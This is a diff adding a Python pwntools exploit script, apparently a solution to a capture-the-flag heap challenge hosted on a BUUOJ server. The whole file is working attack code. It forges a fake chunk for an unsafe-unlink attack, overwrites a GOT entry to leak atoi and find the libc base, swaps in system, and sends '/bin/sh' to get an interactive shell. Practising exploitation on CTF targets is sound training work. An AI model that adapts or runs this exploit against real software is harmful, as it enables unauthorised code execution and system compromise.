@@ -1,0 +1,55 @@
+from pwn import *
+#p=process('./1')
+#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
+#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
+p=remote('node3.buuoj.cn',25647)
+libc=ELF('libc-2.23_64.so')
+context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
+#context.log_level='debug'
+def debug():
+    gdb.attach(p)
+    pause()
+def add(len,con):
+    p.recvuntil('Your choice:')
+    p.sendline('2')
+    p.recvuntil('Please enter the length of item name:')
+    p.sendline(str(len))
+    p.recvuntil('Please enter the name of item:')
+    p.send(str(con))
+def show():
+    p.recvuntil('Your choice:')
+    p.sendline('1')
+def edit(idx,len,con):
+    p.recvuntil('Your choice:')
+    p.sendline('3')
+    p.recvuntil('Please enter the index of item:')
+    p.sendline(str(idx))
+    p.recvuntil('Please enter the length of item name:')
+    p.sendline(str(len))
+    p.recvuntil('Please enter the new name of the item:')
+    p.send(str(con))
+def delete(idx):
+    p.recvuntil('Your choice:')
+    p.sendline('4')
+    p.recvuntil('Please enter the index of item:')
+    p.sendline(str(idx))
+ptr=0x6020c8
+add(0x40,'aaaa')
+add(0x80,'bbbb')
+add(0x80,'cccc')
+fake_chunk=p64(0)+p64(0x41)
+fake_chunk+=p64(ptr-0x18)+p64(ptr-0x10)
+fake_chunk+=0x20*'a'
+fake_chunk+=p64(0x40)+p64(0x90)
+edit(0,0x80,fake_chunk)
+delete(1)
+payload=p64(0)*2+p64(40)+p64(0x602068)
+edit(0,len(payload),payload)
+show()
+atoi_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+libc.address=atoi_addr-libc.sym['atoi']
+print hex(libc.address)
+edit(0,8,p64(libc.sym['system']))
+p.recvuntil('Your choice:')
+p.sendline('/bin/sh\x00')
+p.interactive()
